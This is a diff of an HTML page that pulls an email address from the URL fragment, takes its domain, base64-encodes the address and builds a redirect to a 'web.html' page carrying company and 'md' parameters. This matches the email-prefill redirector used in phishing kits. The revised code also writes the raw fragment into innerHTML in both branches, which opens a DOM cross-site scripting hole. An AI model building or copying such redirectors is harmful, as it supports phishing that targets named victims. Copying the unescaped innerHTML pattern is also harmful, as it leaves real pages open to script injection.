@@ -3,215 +3,135 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Processing Request</title>
+  <title>Email Extractor + Redirect</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      background-color: #f5f5f5;
+      font-family: system-ui, sans-serif;
+      max-width: 520px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+      line-height: 1.6;
     }
-    .message {
-      text-align: center;
-      padding: 20px;
+    #output {
+      margin: 1.5rem 0;
+      padding: 1rem;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      background: #f9f9f9;
+      word-break: break-all;
     }
-    .processing {
-      color: #d32f2f;
-      font-size: 24px;
-      margin-bottom: 10px;
+    .success { color: #2e7d32; }
+    .error   { color: #c62828; }
+    button {
+      padding: 0.6rem 1.2rem;
+      margin: 0.5rem 0.3rem 0 0;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
     }
-    .error {
-      color: #d32f2f;
-      font-size: 18px;
-    }
+    #redirect-btn { background: #1976d2; color: white; }
+    #redirect-btn:hover { background: #1565c0; }
   </style>
 </head>
 <body>
-  <div class="message">
-    <p class="processing">Processing your request...</p>
-    <p class="error" id="errorMessage" style="display:none;"></p>
-  </div>
-  
+  <h1>Email → Redirect Builder</h1>
+  <p>Extracts email from #fragment and prepares redirect URL</p>
+
+  <div id="output">Waiting...</div>
+
+  <button id="copy-email" disabled>Copy email</button>
+  <button id="redirect-btn" disabled>Go to redirect URL</button>
+
   <script>
-    (function() {
-      'use strict';
-      
-      // Configuration
-      const CONFIG = {
-        redirectBase: 'web',
-        minRandom: 188,
-        maxRandom: 2178,
-        allowedDomains: [], // Add allowed domains here, e.g., ['gmail.com', 'company.com']
-        timeout: 3000 // Redirect timeout in ms
-      };
-      
-      /**
-       * Validates email format
-       */
-      function isValidEmail(email) {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(email);
+    // ── Helper: very simple email obfuscation (base64 example)
+    // Replace with your real encodeEmail logic if different
+    function encodeEmail(email) {
+      if (!email) return "";
+      try {
+        return btoa(email);           // base64 – very common simple obfuscation
+        // Alternatives: encodeURIComponent(email.replace(/@/g, "[at]")) etc.
+      } catch (e) {
+        return "";
       }
-      
-      /**
-       * Sanitizes string to prevent XSS
-       */
-      function sanitizeString(str) {
-        const div = document.createElement('div');
-        div.textContent = str;
-        return div.innerHTML;
+    }
+
+    const output      = document.getElementById('output');
+    const copyBtn     = document.getElementById('copy-email');
+    const redirectBtn = document.getElementById('redirect-btn');
+
+    let email = "";
+    let domain = "";
+    let redirectURL = "";
+
+    // 1. Get email from URL hash
+    let fragment = window.location.hash.substring(1);
+    if (fragment) {
+      fragment = decodeURIComponent(fragment.trim());
+    }
+
+    // 2. Basic email validation
+    const isValid = fragment && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragment);
+
+    if (isValid) {
+      email = fragment;
+
+      // 3. Extract domain (your requested logic)
+      const atIndex = email.indexOf("@");
+      if (atIndex !== -1) {
+        domain = email.substring(atIndex + 1);
       }
-      
-      /**
-       * Validates domain against whitelist (if configured)
-       */
-      function isAllowedDomain(domain) {
-        if (CONFIG.allowedDomains.length === 0) {
-          return true; // No whitelist configured
-        }
-        return CONFIG.allowedDomains.includes(domain.toLowerCase());
+
+      // ── Your new variables ───────────────────────────────────────
+      // → Replace these placeholders with real values/logic
+      const num         = "12345";                    // ← define / get from somewhere
+      const num1        = "abc999";                   // ← define / get from somewhere
+      const companyName = "Acme Corp";                // ← define / get from somewhere
+
+      const encodedMd   = encodeEmail(email);        // your &md= parameter
+
+      // 4. Build redirect URL (your requested line – modernized)
+      redirectURL =
+        "https://example.com/web.html?" +
+        num +
+        "&x=" + num1 +
+        "&company=" + encodeURIComponent(companyName) +
+        "&md=" + encodedMd;
+
+      // Show result
+      output.innerHTML = `
+        <strong class="success">Valid email:</strong> ${email}<br>
+        <strong>Domain:</strong> ${domain || "—"}<br><br>
+        <strong>Redirect URL ready:</strong><br>
+        <code style="background:#eee;padding:2px 6px;border-radius:4px;word-break:break-all;">
+          ${redirectURL}
+        </code>
+      `;
+
+      copyBtn.disabled = false;
+      redirectBtn.disabled = false;
+    }
+    else if (fragment) {
+      output.innerHTML = `<strong class="error">Invalid email format:</strong><br>${fragment}`;
+    }
+    else {
+      output.textContent = "No #email@domain.com found in the URL.";
+    }
+
+    // Copy email
+    copyBtn.addEventListener('click', () => {
+      if (!email) return;
+      navigator.clipboard.writeText(email).then(() => {
+        copyBtn.textContent = "Copied!";
+        setTimeout(() => copyBtn.textContent = "Copy email", 1800);
+      });
+    });
+
+    // Redirect button
+    redirectBtn.addEventListener('click', () => {
+      if (redirectURL) {
+        window.location.href = redirectURL;
       }
-      
-      /**
-       * Extracts and validates email from URL hash
-       */
-      function getEmailFromHash() {
-        try {
-          const hash = window.location.hash.substring(1);
-          
-          if (!hash) {
-            throw new Error('No email provided in URL');
-          }
-          
-          // Decode URI component to handle encoded characters
-          const decodedEmail = decodeURIComponent(hash);
-          
-          // Validate email format
-          if (!isValidEmail(decodedEmail)) {
-            throw new Error('Invalid email format');
-          }
-          
-          return decodedEmail;
-        } catch (error) {
-          throw new Error('Failed to extract email: ' + error.message);
-        }
-      }
-      
-      /**
-       * Extracts domain and company name from email
-       */
-      function parseEmail(email) {
-        const atIndex = email.indexOf('@');
-        
-        if (atIndex === -1) {
-          throw new Error('Invalid email: missing @ symbol');
-        }
-        
-        const domain = email.substring(atIndex + 1);
-        
-        if (!domain || domain.indexOf('.') === -1) {
-          throw new Error('Invalid domain in email');
-        }
-        
-        // Validate domain is allowed
-        if (!isAllowedDomain(domain)) {
-          throw new Error('Domain not allowed');
-        }
-        
-        const companyName = domain.split('.')[0];
-        
-        return {
-          email: email,
-          domain: domain,
-          company: companyName
-        };
-      }
-      
-      /**
-       * Generates secure random number in range
-       */
-      function getSecureRandom(min, max) {
-        const range = max - min + 1;
-        const randomBuffer = new Uint32Array(1);
-        window.crypto.getRandomValues(randomBuffer);
-        return min + (randomBuffer[0] % range);
-      }
-      
-      /**
-       * Builds redirect URL with validation
-       */
-      function buildRedirectURL(emailData) {
-        const num = getSecureRandom(CONFIG.minRandom, CONFIG.maxRandom);
-        const num1 = getSecureRandom(CONFIG.minRandom, CONFIG.maxRandom);
-        
-        // Build URL with proper encoding
-        const params = new URLSearchParams({
-          x: num1.toString(),
-          company: emailData.company,
-          md: emailData.email
-        });
-        
-        // Construct URL
-        const url = `${CONFIG.redirectBase}?${num}&${params.toString()}`;
-        
-        // Validate URL format
-        try {
-          new URL(url, window.location.origin);
-          return url;
-        } catch (error) {
-          throw new Error('Failed to construct valid URL');
-        }
-      }
-      
-      /**
-       * Shows error message to user
-       */
-      function showError(message) {
-        const errorElement = document.getElementById('errorMessage');
-        if (errorElement) {
-          errorElement.textContent = sanitizeString(message);
-          errorElement.style.display = 'block';
-        }
-        console.error('Redirect error:', message);
-      }
-      
-      /**
-       * Main execution function
-       */
-      function processRedirect() {
-        try {
-          // Extract and validate email
-          const email = getEmailFromHash();
-          console.log('Processing email redirect...');
-          
-          // Parse email components
-          const emailData = parseEmail(email);
-          
-          // Build redirect URL
-          const redirectURL = buildRedirectURL(emailData);
-          console.log('Redirecting to:', redirectURL);
-          
-          // Perform redirect after timeout
-          setTimeout(function() {
-            window.location.href = redirectURL;
-          }, CONFIG.timeout);
-          
-        } catch (error) {
-          showError(error.message);
-        }
-      }
-      
-      // Execute on page load
-      if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', processRedirect);
-      } else {
-        processRedirect();
-      }
-      
-    })();
+    });
   </script>
 </body>
 </html>
